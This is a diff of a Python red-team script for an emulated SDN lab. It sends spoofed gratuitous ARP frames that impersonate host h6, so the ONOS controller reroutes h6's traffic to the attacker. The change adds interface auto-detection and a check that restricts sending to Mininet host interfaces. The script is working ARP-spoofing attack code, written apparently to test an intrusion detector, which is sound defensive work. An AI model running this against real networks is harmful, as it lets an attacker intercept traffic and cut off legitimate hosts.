@@ -2,42 +2,50 @@
 """
 Sentinel red-team: identity spoofing / host-location hijack (S7).
 
-Unlike the flood, this attack is low-volume. From h1 it sends gratuitous ARP
-frames whose SOURCE MAC is h6's MAC and whose advertised IP is h6's IP. ONOS's
-host-location provider learns where a host lives from ARP, so it moves h6 in its
-host table from its real port (s3:2) to the attacker's port (s1:1). Traffic for
-h6 is then delivered to h1, and the real h6 is cut off.
+Low-volume attack. Sends gratuitous ARP frames whose SOURCE MAC is h6's MAC and
+whose advertised IP is h6's IP, so ONOS's host-location provider moves h6 from
+its real port to the sending host's port. Traffic for h6 is then delivered to
+the attacker, and the real h6 is cut off.
 
-The signal this leaves is NOT a rate spike. It is a host that suddenly changes
-port, and two ports claiming the same MAC. That is why the detector needs the
-host_moves_in and uniq features, not just new_flows.
+The sending host is auto-detected, so this can be launched from ANY host, not
+just h1 -- useful for testing whether the detector's identity path generalises
+across ports.
 
-Runs ONLY inside the emulated lab, from h1, impersonating h6.
+FLAGS
+  --duration N  total seconds the attack runs (default 60)
+  --rate N      spoofed ARPs per second (default 2, low on purpose)
+  --iface NAME  sending interface (default: auto-detect the host's *-eth0)
 
-Run inside h1's namespace (run_scenario.py does this for you):
-  sudo mnexec -a <h1-pid> python3 scenarios/attacks/spoof.py --duration 60
-
-Standalone test from h1's xterm:
-  python3 scenarios/attacks/spoof.py --duration 10 --rate 2
+Run inside a host's namespace (run_scenario.py does this for you):
+  sudo mnexec -a <host-pid> python3 scenarios/attacks/spoof.py --duration 60
 """
 
 import argparse
 import os
+import re
 import sys
 import time
 
 from scapy.all import Ether, ARP, sendp
 
-# Lab targets, fixed by topo/lab_topo.py. Hardcoded to the lab victim.
-IFACE = "h1-eth0"           # only exists inside h1's namespace
-VICTIM_IP = "10.0.3.2"      # h6, the identity being stolen
+# The stolen identity is fixed to h6; only the SOURCE host varies.
+VICTIM_IP = "10.0.3.2"
 VICTIM_MAC = "00:00:00:00:00:06"
 
 
+def detect_iface():
+    """The host's data interface inside its Mininet namespace (h1-eth0,
+    h3-eth0, ...). Auto-detected so the spoof runs from any host."""
+    for name in sorted(os.listdir("/sys/class/net")):
+        if name.endswith("-eth0"):
+            return name
+    sys.exit("no <host>-eth0 interface found; run inside a Mininet host "
+             "(mnexec -a <host-pid> ...).")
+
+
 def gratuitous_arp():
-    """A gratuitous ARP 'reply' announcing that h6's IP is at h6's MAC,
-    but sent from h1's port. op=2 is an unsolicited reply, which hosts and
-    controllers accept as a location update."""
+    """A gratuitous ARP 'reply' announcing h6's IP at h6's MAC, sent from this
+    host's port. op=2 is an unsolicited reply, accepted as a location update."""
     return (Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") /
             ARP(op=2, psrc=VICTIM_IP, hwsrc=VICTIM_MAC,
                 pdst=VICTIM_IP, hwdst="ff:ff:ff:ff:ff:ff"))
@@ -49,22 +57,30 @@ def main():
                    help="total seconds the attack runs (default 60)")
     p.add_argument("--rate", type=float, default=2.0,
                    help="spoofed ARPs per second (default 2, low on purpose)")
+    p.add_argument("--iface", default=None,
+                   help="sending interface (default: auto-detect <host>-eth0)")
     args = p.parse_args()
 
-    if not os.path.exists("/sys/class/net/%s" % IFACE):
-        sys.exit("%s not found. Run this inside h1 (mnexec -a <h1-pid> ...)."
-                 % IFACE)
+    iface = args.iface or detect_iface()
+    # Lab lock: only ever send from a Mininet host interface (h1-eth0, h3-eth0,
+    # ...), never the VM's real NIC. Blocks e.g. --iface eth0 in the root namespace.
+    if not re.fullmatch(r"h\d+-eth0", iface):
+        sys.exit("refusing %s: only Mininet host interfaces (h1-eth0, h3-eth0, ...)"
+                 % iface)
+    if not os.path.exists("/sys/class/net/%s" % iface):
+        sys.exit("%s not found. Run this inside a Mininet host "
+                 "(mnexec -a <host-pid> ...)." % iface)
 
     frame = gratuitous_arp()
     gap = 1.0 / args.rate
     end = time.time() + args.duration
     sent = 0
-    print("spoof: claiming h6 (%s / %s) on h1's port, %.1f ARP/s for %ds" %
-          (VICTIM_IP, VICTIM_MAC, args.rate, args.duration), flush=True)
+    print("spoof: iface=%s claiming h6 (%s / %s), %.1f ARP/s for %ds" %
+          (iface, VICTIM_IP, VICTIM_MAC, args.rate, args.duration), flush=True)
 
     try:
         while time.time() < end:
-            sendp(frame, iface=IFACE, verbose=False)
+            sendp(frame, iface=iface, verbose=False)
             sent += 1
             time.sleep(gap)
     except KeyboardInterrupt:
